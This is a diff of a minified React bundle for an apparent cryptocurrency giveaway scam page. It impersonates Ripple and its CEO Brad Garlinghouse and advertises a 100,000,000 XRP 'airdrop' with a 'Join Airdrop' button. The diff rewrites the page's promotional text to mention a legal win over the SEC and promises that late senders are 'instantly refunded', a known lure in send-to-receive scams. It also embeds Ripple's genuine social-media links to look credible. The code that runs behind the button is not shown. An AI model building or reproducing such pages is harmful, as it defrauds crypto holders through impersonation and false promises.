@@ -335,7 +335,6 @@ Error generating stack: `+o.message+`
         align-items: center;
         gap:20px;
         font-size:30px;
-        
     }
     /* & > div:last-of-type > a{
         color:var(--text-colo);
@@ -434,7 +433,28 @@ Error generating stack: `+o.message+`
         margin-top:15px;
     }
     
-`;function w1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"}}]})(e)}function x1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"}}]})(e)}function S1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"}}]})(e)}function k1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"}}]})(e)}const C1=()=>v.jsxs(E1,{children:[v.jsxs("div",{children:[v.jsx("img",{src:"./favicon.png",alt:"logo"}),v.jsxs("div",{children:[v.jsx("span",{children:"XRP"}),v.jsx("span",{children:v.jsx(pp,{})})]})]}),v.jsx("div",{children:v.jsxs("span",{children:[v.jsx(w1,{}),"  Airdrop live"]})})]}),E1=ce.div`
+`;function w1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"}}]})(e)}function x1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"}}]})(e)}function S1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"}}]})(e)}function k1(e){return ll({tag:"svg",attr:{fill:"currentColor",viewBox:"0 0 16 16"},child:[{tag:"path",attr:{d:"M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"}}]})(e)}const C1 = () =>
+    v.jsxs(E1, {
+      children: [
+        v.jsxs("div", {
+          children: [
+            v.jsx("img", { src: "./favicon.png", alt: "logo" }),
+            v.jsxs("div", {
+              children: [
+                v.jsx("span", { children: "XRP" }),
+                v.jsx("span", { children: v.jsx(pp, {}) }),
+              ],
+            }),
+          ],
+        }),
+        v.jsx("div", {
+          children: v.jsxs("span", {
+            children: [v.jsx(w1, {}), "  Airdrop live"],
+          }),
+        }),
+      ],
+    }),
+  E1 = ce.div`
   display:flex;
   justify-content: space-between;
   gap:20px;
@@ -482,7 +502,103 @@ Error generating stack: `+o.message+`
     }
   }
   
-`,pp=()=>v.jsxs(v.Fragment,{children:[v.jsx("a",{href:"https://www.facebook.com/rippleofficial",target:"_blank",children:v.jsx(x1,{})}),v.jsx("a",{href:"https://www.youtube.com/channel/UCjok1uTSBUgvRYQaASz6YWw",target:"_blank",children:v.jsx(k1,{})}),v.jsx("a",{href:"https://twitter.com/Ripple",target:"_blank",children:v.jsx(S1,{})})]}),zi=e=>{let t=e.toString(),n=t.length,r="",l=-3,o=0;for(let i=n-1;i>=0;i-=3)i==n-1?(r=`${t.slice(l)}`,o=l,l-=3,l<n*-1&&(l=n*-1)):(r=`${t.slice(l,o)},${r}`,o=l,l-=3,l<n*-1&&(l=n*-1));return r},P1=()=>{const[e,t]=P.useState({token:"RENDER TOKEN (RNDR)",type:"Multi-Chain",total_supply:99988621362,market_cap:39199002269,total_volume:1305219630}),n=fp();return P.useEffect(()=>{if(n&&n.length>0){const r=n.find(function(l){return l.id=="ripple"});r&&t({...e,total_supply:Math.floor(r.total_supply),market_cap:Math.floor(r.market_cap),total_volumn:Math.floor(r.total_volumn)})}},[n]),v.jsxs(_1,{children:[v.jsxs("div",{children:[v.jsx("span",{children:"Token"}),v.jsx("span",{children:"XRP (XRP)"})]}),v.jsxs("div",{children:[v.jsx("span",{children:"Type"}),v.jsx("span",{children:e.type})]}),v.jsxs("div",{children:[v.jsx("span",{children:"Total Supply"}),v.jsxs("span",{children:[zi(e.total_supply)," XRP"]})]}),v.jsxs("div",{children:[v.jsx("span",{children:"Market Cap"}),v.jsxs("span",{children:["$",zi(e.market_cap)]})]}),v.jsxs("div",{children:[v.jsx("span",{children:"Total Volume"}),v.jsxs("span",{children:[zi(e.total_volume)," XRP"]})]})]})},_1=ce.div`
+`,
+  pp = () =>
+    v.jsxs(v.Fragment, {
+      children: [
+        v.jsx("a", {
+          href: "https://www.facebook.com/rippleofficial",
+          target: "_blank",
+          children: v.jsx(x1, {}),
+        }),
+        v.jsx("a", {
+          href: "https://www.youtube.com/channel/UCjok1uTSBUgvRYQaASz6YWw",
+          target: "_blank",
+          children: v.jsx(k1, {}),
+        }),
+        v.jsx("a", {
+          href: "https://twitter.com/Ripple",
+          target: "_blank",
+          children: v.jsx(S1, {}),
+        }),
+      ],
+    }),
+  zi = (e) => {
+    let t = e.toString(),
+      n = t.length,
+      r = "",
+      l = -3,
+      o = 0;
+    for (let i = n - 1; i >= 0; i -= 3)
+      i == n - 1
+        ? ((r = `${t.slice(l)}`), (o = l), (l -= 3), l < n * -1 && (l = n * -1))
+        : ((r = `${t.slice(l, o)},${r}`),
+          (o = l),
+          (l -= 3),
+          l < n * -1 && (l = n * -1));
+    return r;
+  },
+  P1 = () => {
+    const [e, t] = P.useState({
+        token: "RENDER TOKEN (RNDR)",
+        type: "Multi-Chain",
+        total_supply: 99988621362,
+        market_cap: 39199002269,
+        total_volume: 1305219630,
+      }),
+      n = fp();
+    return (
+      P.useEffect(() => {
+        if (n && n.length > 0) {
+          const r = n.find(function (l) {
+            return l.id == "ripple";
+          });
+          r &&
+            t({
+              ...e,
+              total_supply: Math.floor(r.total_supply),
+              market_cap: Math.floor(r.market_cap),
+              total_volumn: Math.floor(r.total_volumn),
+            });
+        }
+      }, [n]),
+      v.jsxs(_1, {
+        children: [
+          v.jsxs("div", {
+            children: [
+              v.jsx("span", { children: "Token" }),
+              v.jsx("span", { children: "XRP (XRP)" }),
+            ],
+          }),
+          v.jsxs("div", {
+            children: [
+              v.jsx("span", { children: "Type" }),
+              v.jsx("span", { children: e.type }),
+            ],
+          }),
+          v.jsxs("div", {
+            children: [
+              v.jsx("span", { children: "Total Supply" }),
+              v.jsxs("span", { children: [zi(e.total_supply), " XRP"] }),
+            ],
+          }),
+          v.jsxs("div", {
+            children: [
+              v.jsx("span", { children: "Market Cap" }),
+              v.jsxs("span", { children: ["$", zi(e.market_cap)] }),
+            ],
+          }),
+          v.jsxs("div", {
+            children: [
+              v.jsx("span", { children: "Total Volume" }),
+              v.jsxs("span", { children: [zi(e.total_volume), " XRP"] }),
+            ],
+          }),
+        ],
+      })
+    );
+  },
+  _1 = ce.div`
   margin-top:10px;
   width:100%;
   display:flex;
@@ -501,7 +617,62 @@ Error generating stack: `+o.message+`
       font-size:15px;
     }
   }
-`,j1="./vid.mp4",R1=()=>{const{setShowModal:e,setModalContent:t}=Jo(),n=()=>{t(v.jsx(dp,{})),e(!0)};return v.jsxs(v.Fragment,{children:[v.jsx(t1,{}),v.jsxs(N1,{children:[v.jsxs($1,{children:[v.jsx(C1,{}),v.jsxs(L1,{children:["The XRP Ledger (XRPL) is a decentralized, public blockchain led by a global developer community. It's fast, energy efficient, and reliable. With ease of development, low transaction costs, and a knowledgeable community, it provides developers with a strong open-source foundation for executing on the most demanding projects—without hurting the environment.",v.jsx("br",{}),"To commemorate the progress made by XRPL in the advancement of the XRP LEDGER community, we have committed a total of 10,000,000 $XRP for airdrop to fans worldwide. Every person can participate. In order to be eligible, participants should have a minimum of 1500 $XRP during the competition period. All Qualifying users will split a pool of 10,000,000 $XRP"]}),v.jsx(z1,{children:v.jsxs("video",{autoPlay:!0,muted:!0,loop:!0,controls:!0,children:[v.jsx("source",{src:j1,type:"video/mp4"}),"Your browser does not support the video tag."]})}),v.jsx(P1,{})]}),v.jsxs(T1,{children:[v.jsxs("div",{children:[v.jsx("img",{src:"./favicon.png",alt:"icon"}),v.jsx("span",{children:"XRP"})]}),v.jsx(h1,{}),v.jsx(g1,{}),v.jsx("div",{style:{width:"100%",marginTop:"20px"},children:v.jsx(Zr,{onClick:n,bg:"var(--text-color)",color:"var(--white-color)",style:{borderRadius:"3px",width:"100%"},children:v.jsx("span",{children:"Join Airdrop"})})})]})]}),v.jsx(c1,{})]})},N1=ce.main`
+`,
+  j1 = "./image.jpg",
+  R1 = () => {
+    const { setShowModal: e, setModalContent: t } = Jo();
+
+    const n = () => {
+      t(v.jsx(dp, {}));
+      e(!0);
+    };
+
+    return v.jsxs(v.Fragment, {
+      children: [
+        v.jsx(t1, {}),
+        v.jsxs(N1, {
+          children: [
+            v.jsxs($1, {
+              children: [
+                v.jsx(C1, {}),
+                v.jsxs(L1, {
+                  children: [
+                    "To celebrate our recent legal win against the SEC, we are having a 100,000,000 XRP giveaway. Nothing we do at Ripple would be possible without our community, and this is just a part of our efforts to assert that. Note: All persons are able to participate, including those in the United States. The competition will last until the entirety of the 100,000,000 XRP held in the airdrop-funds have been released. If you are late, your XRP will be instantly refunded. Thanks, Brad Garlinghouse",
+                  ],
+                }),
+                v.jsx("img", { src: j1, alt: "Description of the image" }), // Change this line to display the image
+                v.jsx(P1, {}),
+              ],
+            }),
+            v.jsxs(T1, {
+              children: [
+                v.jsxs("div", {
+                  children: [
+                    v.jsx("img", { src: "./favicon.png", alt: "icon" }),
+                    v.jsx("span", { children: "XRP" }),
+                  ],
+                }),
+                v.jsx(h1, {}),
+                v.jsx(g1, {}),
+                v.jsx("div", {
+                  style: { width: "100%", marginTop: "20px" },
+                  children: v.jsx(Zr, {
+                    onClick: n,
+                    bg: "var(--text-color)",
+                    color: "var(--white-color)",
+                    style: { borderRadius: "3px", width: "100%" },
+                    children: v.jsx("span", { children: "Join Airdrop" }),
+                  }),
+                }),
+              ],
+            }),
+          ],
+        }),
+        v.jsx(c1, {}),
+      ],
+    });
+  },
+  N1 = ce.main`
   padding:30px 7%;
   display: flex;
   gap:30px;
@@ -534,7 +705,8 @@ Error generating stack: `+o.message+`
   }
 
 
-`,$1=ce.div`
+`,
+  $1 = ce.div`
   padding: 30px 20px;
   display: flex;
   flex-direction: column;
@@ -546,7 +718,8 @@ Error generating stack: `+o.message+`
      padding: 20px 12px;
   }
 
-`,z1=ce.div`
+`,
+  z1 = ce.div`
    width:100%;
    height: fit-content;
    display: flex;
@@ -575,7 +748,8 @@ Error generating stack: `+o.message+`
         height:200px;
       }
    }
-`,T1=ce.div`
+`,
+  T1 = ce.div`
   position: relative;
   overflow: hidden;
   padding:20px;
@@ -595,7 +769,8 @@ Error generating stack: `+o.message+`
   @media screen and (max-width:550px) {
      padding: 20px 12px;
   }
-`,L1=ce.p`
+`,
+  L1 = ce.p`
   font-size:16px;
   color:var(--black-color);
   line-height:1.8;
